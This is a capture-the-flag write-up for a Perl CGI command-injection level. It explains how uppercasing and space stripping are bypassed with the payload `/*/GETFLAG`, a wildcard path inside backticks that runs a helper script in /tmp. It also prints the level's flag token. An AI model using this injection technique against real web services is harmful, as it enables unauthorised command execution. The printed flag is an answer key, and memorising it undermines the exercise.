# Level 12: Command Injection via Perl CGI Script

This document explains the vulnerability in the `level12.pl` script and the steps taken to exploit it.

## 1. Script Explanation

The target is a Perl CGI script (`level12.pl`) listening on `localhost:4646`.

Key parts of the script:

-   It uses the CGI module to get parameters `x` and `y` from the request:
    ```perl
    use CGI qw{param};
    # ... later ...
    n(t(param("x"), param("y")));
    ```
-   The subroutine `t` processes the `x` parameter:
    -   Converts it to uppercase: `$xx =~ tr/a-z/A-Z/;`
    -   Removes everything after the first space: `$xx =~ s/\s.*//;`
    ```perl
    sub t {
      $nn = $_[1]; # y param
      $xx = $_[0]; # x param
      $xx =~ tr/a-z/A-Z/;
      $xx =~ s/\s.*//;
      # ...
    }
    ```
-   It then uses the processed `$xx` value directly within a shell command executed via backticks:
    ```perl
    @output = `egrep "^$xx" /tmp/xd 2>&1`;
    ```
-   The script checks if any line returned by `egrep`, specifically the part after the first colon (`:`), matches the `y` parameter (`$nn`) as a regex. It prints `..` for a match and `.` otherwise.

## 2. Vulnerability Analysis

The primary vulnerability is **Command Injection** in the line:
```perl
@output = `egrep "^$xx" /tmp/xd 2>&1`;
```
The script directly embeds the user-controlled (though modified) `$xx` variable into a command string executed by the system's shell via backticks.

**Challenges:**

1.  **Uppercase Conversion:** `$xx =~ tr/a-z/A-Z/;` prevents direct injection of lowercase commands (like `getflag`).
2.  **Space Removal:** `$xx =~ s/\s.*//;` prevents injecting commands with spaces or arguments separated by spaces.

## 3. Exploitation Method

The vulnerability was exploited by bypassing the uppercase and space removal limitations to execute the `getflag` command and redirect its output to a readable file.

**Steps:**

1.  **Create Helper Script:** A helper script was created at `/tmp/GETFLAG`. Crucially, this script *itself* contained the necessary command and redirection:
    ```bash
    # Command executed in the shell:
    echo "getflag > /tmp/FLAG" > /tmp/GETFLAG
    chmod +x /tmp/GETFLAG
    ```
    When `/tmp/GETFLAG` is executed, it runs `getflag` and writes the output to `/tmp/FLAG`.

2.  **Construct Payload:** The `x` parameter was crafted to execute the helper script using backticks and a wildcard path:
    *   Payload: `` `/*/GETFLAG` ``
    *   This payload contains no spaces, avoiding the space removal issue.
    *   The wildcard `*` is not affected by the uppercase conversion.

3.  **Send Request:** The payload was sent to the script via `nc` (URL encoding wasn't strictly necessary here as the critical characters `*`, `/`, `` ` `` often pass through, but encoding `%60%2A%2FGETFLAG%60` would also work):
    ```http
    GET /?x=`/*/GETFLAG`&y=a HTTP/1.0
    ```
    (Followed by two Enters)

4.  **Execution Trace:**
    *   Perl script receives `` x=`/*/GETFLAG` ``.
    *   Uppercases to ``$xx = `/*/GETFLAG` ``.
    *   Removes spaces (none): `$xx` remains `` `/*/GETFLAG` ``.
    *   Command executed by Perl: `` `egrep "^`/*/GETFLAG`" /tmp/xd 2>&1` ``.
    *   Shell executes inner backticks: `` `/*/GETFLAG` ``.
    *   Shell expands `/*/GETFLAG` to `/tmp/GETFLAG`.
    *   Shell executes the script `/tmp/GETFLAG`.
    *   `/tmp/GETFLAG` runs `getflag > /tmp/FLAG`, writing the flag to `/tmp/FLAG`.
    *   The inner backticks produce no standard output (due to redirection).
    *   The outer `egrep` command runs on an empty pattern prefix.
    *   The Perl script prints `.` (no match found based on `egrep` output).

5.  **Retrieve Flag:** The flag was read from the output file:
    ```bash
    cat /tmp/FLAG
    ```
    Output: `Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr`

This method cleverly used a wildcard path within command substitution to bypass the script's input sanitization and execute the desired command indirectly via the helper script, redirecting the output successfully.